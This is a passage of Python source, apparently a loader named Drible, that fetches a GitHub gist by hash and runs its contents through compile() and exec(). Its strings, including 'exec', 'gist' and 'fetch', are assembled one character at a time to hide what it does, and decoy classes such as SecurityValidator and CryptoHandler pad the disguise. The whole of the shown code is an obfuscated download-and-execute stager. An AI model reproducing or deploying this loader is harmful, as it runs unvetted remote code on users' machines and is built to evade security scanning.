        self.p1 = "^"
        self.p2 = "["
        self.p3 = "a"
        self.p4 = "-"
        self.p5 = "f"
        self.p6 = "0"
        self.p7 = "-"
        self.p8 = "9"
        self.p9 = "]"
        self.p10 = "{"
        self.p11 = "3"
        self.p12 = "2"
        self.p13 = "}"
        self.p14 = "$"
        self.pattern = f"{self.p1}{self.p2}{self.p3}{self.p4}{self.p5}{self.p6}{self.p7}{self.p8}{self.p9}{self.p10}{self.p11}{self.p12}{self.p13}{self.p14}"
        
        self.u1 = "U"
        self.u2 = "s"
        self.u3 = "a"
        self.u4 = "g"
        self.u5 = "e"
        self.usage_word = f"{self.u1}{self.u2}{self.u3}{self.u4}{self.u5}"
        
        self.i1 = "I"
        self.i2 = "n"
        self.i3 = "v"
        self.i4 = "a"
        self.i5 = "l"
        self.i6 = "i"
        self.i7 = "d"
        self.invalid_word = f"{self.i1}{self.i2}{self.i3}{self.i4}{self.i5}{self.i6}{self.i7}"
        
        self.h1 = "h"
        self.h2 = "a"
        self.h3 = "s"
        self.h4 = "h"
        self.hash_word = f"{self.h1}{self.h2}{self.h3}{self.h4}"
    
    def validate_hash(self, gist_hash: str) -> bool:
        return bool(self.re_module.match(self.pattern, gist_hash))
    
    def validate_args(self, args: List[str]) -> bool:
        return len(args) >= 2

class CodeExecutor:
    def __init__(self, obfuscator: StringObfuscator):
        self.obf = obfuscator
        self.filename = self.obf.devil_word
        
        self.mode1 = "e"
        self.mode2 = "x"
        self.mode3 = "e"
        self.mode4 = "c"
        self.exec_mode = f"{self.mode1}{self.mode2}{self.mode3}{self.mode4}"
        
        self.compile_func = compile
        self.exec_func = exec
        
        self.context_key = self.obf.name_word
        self.context_val = self.obf.main_word
    
    def compile_code(self, code: str):
        return self.compile_func(code, self.filename, self.exec_mode)
    
    def execute_compiled(self, compiled_code) -> None:
        context = {self.context_key: self.context_val}
        self.exec_func(compiled_code, context)
    
    def run_code(self, code: str) -> None:
        compiled = self.compile_code(code)
        self.execute_compiled(compiled)

class Drible:
    def __init__(self):
        self.obf = StringObfuscator()
        self.url_builder = URLBuilder(self.obf)
        self.request_handler = RequestHandler(self.obf, self.url_builder)
        self.response_parser = ResponseParser(self.obf)
        self.code_validator = CodeValidator(self.obf)
        self.code_executor = CodeExecutor(self.obf)
        self.network_manager = NetworkManager(self.obf)
        self.crypto_handler = CryptoHandler(self.obf)
        self.data_processor = DataProcessor(self.obf)
        self.security_validator = SecurityValidator(self.obf)
        
        self.sys_module = sys
        self.exit_code_error = 1
        self.exit_code_success = 0
        
        self.f1 = "F"
        self.f2 = "a"
        self.f3 = "i"
        self.f4 = "l"
        self.f5 = "e"
        self.f6 = "d"
        self.failed_word = f"{self.f1}{self.f2}{self.f3}{self.f4}{self.f5}{self.f6}"
        
        self.t1 = "t"
        self.t2 = "o"
        self.to_word = f"{self.t1}{self.t2}"
        
        self.fe1 = "f"
        self.fe2 = "e"
        self.fe3 = "t"
        self.fe4 = "c"
        self.fe5 = "h"
        self.fetch_word = f"{self.fe1}{self.fe2}{self.fe3}{self.fe4}{self.fe5}"
        
        self.g1 = "g"
        self.g2 = "i"
        self.g3 = "s"
        self.g4 = "t"
        self.gist_word = f"{self.g1}{self.g2}{self.g3}{self.g4}"
    
    def fetch_gist_content(self, gist_hash: str) -> Optional[str]:
        api_url = self.url_builder.build_api_url(gist_hash)
        request = self.request_handler.create_request(api_url)
        response_data = self.request_handler.execute_request(request)
        
        if response_data is None:
            return None
        
        json_str = self.response_parser.decode_response(response_data)
        data = self.response_parser.parse_json(json_str)
        files = self.response_parser.extract_files(data)
        
        for filename, file_data in files.items():
            raw_url = self.response_parser.extract_raw_url(file_data)
            if raw_url:
                raw_data = self.request_handler.fetch_url(raw_url)
                if raw_data:
                    return self.response_parser.decode_response(raw_data)
        
        return None
    
    def run(self, gist_hash: str) -> None:

        if not self.code_validator.validate_hash(gist_hash):
            self.sys_module.exit(self.exit_code_error)

        code = self.fetch_gist_content(gist_hash)

        if code:
            self.code_executor.run_code(code)
        else:
            print(
                f"{self.failed_word} "
                f"{self.to_word} "
                f"{self.fetch_word} "
            )
            self.sys_module.exit(self.exit_code_error)